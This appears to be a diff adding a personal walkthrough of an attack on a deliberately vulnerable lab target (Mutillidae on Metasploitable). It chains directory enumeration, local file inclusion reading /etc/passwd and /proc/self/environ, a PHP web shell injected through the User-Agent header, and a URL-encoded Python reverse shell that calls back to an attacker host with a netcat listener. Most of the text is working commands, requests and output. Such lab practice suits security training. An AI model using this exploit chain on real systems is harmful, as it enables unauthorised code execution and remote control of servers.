@@ -1,0 +1,123 @@
+LFI → /proc/self/environ injection → RCE
+-----------------------------------------------
+
+
+first directory finding
+
+> gobuster dir \
+-u http://10.0.2.4/mutillidae/ \
+-w /usr/share/wordlists/dirb/common.txt
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.0.2.4/mutillidae/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 296]
+/.htaccess            (Status: 403) [Size: 301]
+/.htpasswd            (Status: 403) [Size: 301]
+/classes              (Status: 301) [Size: 322] [--> http://10.0.2.4/mutillidae/classes/]
+/documentation        (Status: 301) [Size: 328] [--> http://10.0.2.4/mutillidae/documentation/]                                                                                             
+/credits              (Status: 200) [Size: 509]
+/favicon.ico          (Status: 200) [Size: 1150]
+/footer               (Status: 200) [Size: 450]
+/home                 (Status: 200) [Size: 2930]
+/header               (Status: 200) [Size: 19879]
+/images               (Status: 301) [Size: 321] [--> http://10.0.2.4/mutillidae/images/]
+/includes             (Status: 301) [Size: 323] [--> http://10.0.2.4/mutillidae/includes/]
+/javascript           (Status: 301) [Size: 325] [--> http://10.0.2.4/mutillidae/javascript/]
+/installation         (Status: 200) [Size: 8138]
+/login                (Status: 200) [Size: 4102]
+/index.php            (Status: 200) [Size: 24199]
+/index                (Status: 200) [Size: 24199]
+/inc                  (Status: 200) [Size: 386260]
+/notes                (Status: 200) [Size: 1721]
+/passwords            (Status: 301) [Size: 324] [--> http://10.0.2.4/mutillidae/passwords/]
+/page-not-found       (Status: 200) [Size: 705]
+/phpMyAdmin           (Status: 200) [Size: 174]
+/phpinfo.php          (Status: 200) [Size: 48741]
+/phpinfo              (Status: 200) [Size: 48729]
+/robots.txt           (Status: 200) [Size: 160]
+/robots               (Status: 200) [Size: 160]
+/register             (Status: 200) [Size: 1823]
+/styles               (Status: 301) [Size: 321] [--> http://10.0.2.4/mutillidae/styles/]
+Progress: 4613 / 4613 (100.00%)
+===============================================================
+Finished
+======================
+
+
+
+
+
+next 
+
+
+http://10.0.2.4/mutillidae/index.php?page=../../../../etc/passwd
+
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh dhcp:x:101:102::/nonexistent:/bin/false syslog:x:102:103::/home/syslog:/bin/false klog:x:103:104::/home/klog:/bin/false sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash bind:x:105:113::/var/cache/bind:/bin/false postfix:x:106:115::/var/spool/postfix:/bin/false ftp:x:107:65534::/home/ftp:/bin/false postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false distccd:x:111:65534::/:/bin/false user:x:1001:1001:just a user,111,,:/home/user:/bin/bash service:x:1002:1002:,,,:/home/service:/bin/bash telnetd:x:112:120::/nonexistent:/bin/false proftpd:x:113:65534::/var/run/proftpd:/bin/false statd:x:114:65534::/var/lib/nfs:/bin/false
+
+
+> http://10.0.2.4/mutillidae/index.php?page=../../../../etc/hosts
+
+
+127.0.0.1 localhost 127.0.1.1 metasploitable.localdomain metasploitable # The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters ff02::3 ip6-allhosts 
+
+
+
+
+> http://10.0.2.4/mutillidae/index.php?page=../../../../proc/self/environ
+
+
+REDIRECT_HANDLER=php5-cgiREDIRECT_STATUS=200HTTP_HOST=10.0.2.4HTTP_USER_AGENT=Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5HTTP_ACCEPT_ENCODING=gzip, deflateHTTP_CONNECTION=keep-aliveHTTP_COOKIE=PHPSESSID=2bfed1d663b69863df27a3bf582ecb39HTTP_UPGRADE_INSECURE_REQUESTS=1HTTP_PRIORITY=u=0, iPATH=/usr/local/bin:/usr/bin:/binSERVER_SIGNATURE=
+Apache/2.2.8 (Ubuntu) DAV/2 Server at 10.0.2.4 Port 80
+SERVER_SOFTWARE=Apache/2.2.8 (Ubuntu) DAV/2SERVER_NAME=10.0.2.4SERVER_ADDR=10.0.2.4SERVER_PORT=80REMOTE_ADDR=10.0.2.5DOCUMENT_ROOT=/var/www/SERVER_ADMIN=webmaster@localhostSCRIPT_FILENAME=/usr/lib/cgi-bin/phpREMOTE_PORT=35806REDIRECT_QUERY_STRING=page=../../../../proc/self/environREDIRECT_URL=/mutillidae/index.phpGATEWAY_INTERFACE=CGI/1.1SERVER_PROTOCOL=HTTP/1.1REQUEST_METHOD=GETQUERY_STRING=page=../../../../proc/self/environREQUEST_URI=/mutillidae/index.php?page=../../../../proc/self/environSCRIPT_NAME=/cgi-bin/phpPATH_INFO=/mutillidae/index.phpPATH_TRANSLATED=/var/www/mutillidae/index.php 
+
+
+
+after that test in burp by changing user-agent:
+
+
+GET /mutillidae/index.php?page=login.php HTTP/1.1
+Host: 10.0.2.4
+Accept-Language: en-GB,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: BURPTEST123
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+and visit the url of environment > http://10.0.2.4/mutillidae/index.php?page=../../../../proc/self/environ > if the input appears it execute it 
+
+
+
+next GET /mutillidae/index.php?page=../../../../proc/self/environ&cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%2210.0.2.5%22%2C4444))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)%3B%27 HTTP/1.1
+Host: 10.0.2.4
+Accept-Language: en-GB,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: <?php system($_GET['cmd']); ?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=6323b720f4607745865ebd0eed7e2841
+If-Modified-Since: Sun, 01 Mar 2026 09:23:29 GMT
+Connection: keep-alive
+
+ and visit the response url before that run nc listener , visit the site , get the reverse shell 
+
+
+
+extra
+-----
+
+GET /mutillidae/index.php?page=../../../../proc/self/environ&cmd=id HTTP/1.1
+Host: 10.0.2.4
+User-Agent: <?php system($_GET['cmd']); ?>
+...
